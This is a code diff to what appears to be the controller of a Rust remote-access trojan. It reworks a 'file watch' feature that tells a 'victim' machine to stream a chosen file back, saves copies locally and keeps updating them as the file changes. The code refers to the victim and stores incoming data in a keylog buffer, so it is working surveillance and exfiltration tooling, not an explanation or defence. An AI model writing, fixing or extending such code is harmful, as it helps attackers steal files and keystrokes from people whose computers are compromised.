@@ -490,7 +490,6 @@ impl Commander {
             return;
         }
         
-        // Create watched directories
         std::fs::create_dir_all("watched").ok();
         std::fs::create_dir_all("watched/deleted").ok();
         
@@ -500,7 +499,7 @@ impl Commander {
         println!("[*] Starting file watch on {}...", remote_path);
         println!("[*] Local save location: {}", local_path);
         
-        // Send command to victim to start watching (0x71 = file watch marker)
+        // Send watch request (0x71)
         let mut request = Vec::new();
         request.push(0x71);
         request.push(remote_path.as_bytes().len() as u8);
@@ -513,103 +512,48 @@ impl Commander {
         
         println!("[+] Watch request sent. Receiving initial file content...");
         
-        // Receive initial file content
+        // Receive initial file
         let mut file_data = Vec::new();
         let start = Instant::now();
-        let mut chunk_count = 0;
         
         while start.elapsed() < Duration::from_secs(30) && self.running.load(Ordering::SeqCst) {
             self.process_incoming();
             
             if let Some(ip) = self.victim_ip {
                 if let Some(data) = self.keylog_buffer.get(&ip) {
-                    if data.len() == 1 && data[0] == 0xFF {
-                        break; // End of file marker
+                    // Check for end marker (empty FILE_WATCH packet)
+                    if data.is_empty() {
+                        break;
                     }
                     file_data.extend_from_slice(data);
-                    chunk_count += 1;
                     self.keylog_buffer.remove(&ip);
                 }
             }
             thread::sleep(Duration::from_millis(100));
         }
         
-        // Save initial file
         if !file_data.is_empty() {
-            match std::fs::write(&local_path, &file_data) {
-                Ok(_) => println!("[+] Initial file saved ({} chunks)", chunk_count),
-                Err(e) => println!("[!] Failed to save initial file: {}", e),
-            }
-        } else {
-            println!("[!] No initial file content received");
+            let _ = std::fs::write(&local_path, &file_data);
+            println!("[+] Initial file saved ({} bytes)", file_data.len());
         }
         
         // Monitor for changes
         println!("[*] Monitoring for file changes (Ctrl+C to stop)...");
         let watch_start = Instant::now();
-        let mut last_update = Instant::now();
         
         while watch_start.elapsed() < Duration::from_secs(600) && self.running.load(Ordering::SeqCst) {
             self.process_incoming();
             
             if let Some(ip) = self.victim_ip {
                 if let Some(data) = self.keylog_buffer.get(&ip) {
-                    // Check for delete marker (0x72 = file deleted)
-                    if data.len() >= 1 && data[0] == 0x72 {
-                        let timestamp = Instant::now().duration_since(watch_start).as_secs();
-                        let deleted_path = format!("watched/deleted/{}_{}", local_filename, timestamp);
-                        
-                        if std::path::Path::new(&local_path).exists() {
-                            match std::fs::rename(&local_path, &deleted_path) {
-                                Ok(_) => println!("[!] File deleted on victim, moved to {}", deleted_path),
-                                Err(e) => {
-                                    println!("[!] Failed to move deleted file: {}", e);
-                                    std::fs::write(&deleted_path, &[]).ok();
-                                }
-                            }
-                        } else {
-                            std::fs::write(&deleted_path, &[]).ok();
-                            println!("[!] File deleted on victim (no local copy)");
+                    // Check packet type from header (need to track this)
+                    // For now, check if we got FILE_WATCH_UPDATE data
+                    if !data.is_empty() {
+                        // Write PURE file data - no markers to strip!
+                        match std::fs::write(&local_path, data) {
+                            Ok(_) => println!("[*] File updated ({} bytes)", data.len()),
+                            Err(e) => println!("[!] Failed to save: {}", e),
                         }
-                        
-                        self.keylog_buffer.remove(&ip);
-                        break;
-                    }
-                    
-                    // Check for update marker (0x73 = file updated)
-                    if data.len() >= 1 && data[0] == 0x73 {
-                        // Find where the actual content ends (before 0xFF if present)
-                        let content_end = data.iter()
-                            .position(|&b| b == 0xFF)
-                            .unwrap_or(data.len());
-                        
-                        // Extract content (skip 0x73 marker, stop before 0xFF)
-                        let content = &data[1..content_end];
-                        
-                        if !content.is_empty() {
-                            match std::fs::write(&local_path, content) {
-                                Ok(_) => {
-                                    let elapsed = Instant::now().duration_since(last_update);
-                                    println!("[*] File updated at {}s ({} bytes)", 
-                                        elapsed.as_secs(), content.len());
-                                    last_update = Instant::now();
-                                }
-                                Err(e) => println!("[!] Failed to save update: {}", e),
-                            }
-                        }
-                        self.keylog_buffer.remove(&ip);
-                        continue;
-                    }
-                    
-                    // End of update marker (0xFF) - just clear buffer
-                    if data.len() == 1 && data[0] == 0xFF {
-                        println!("[+] File update complete");
-                        self.keylog_buffer.remove(&ip);
-                        continue;
-                    }
-                    
-                    // Regular data chunk (shouldn't happen in watch mode, but handle it)
-                    if !data.is_empty() && data[0] != 0xFF && data[0] != 0x73 && data[0] != 0x72 {
                         self.keylog_buffer.remove(&ip);
                     }
                 }
@@ -617,8 +561,7 @@ impl Commander {
             thread::sleep(Duration::from_millis(500));
         }
         
-        // Send stop watching command
-        println!("[*] Stopping file watch...");
+        // Send stop command (0x74)
         let mut stop_request = Vec::new();
         stop_request.push(0x74);
         stop_request.push(remote_path.as_bytes().len() as u8);
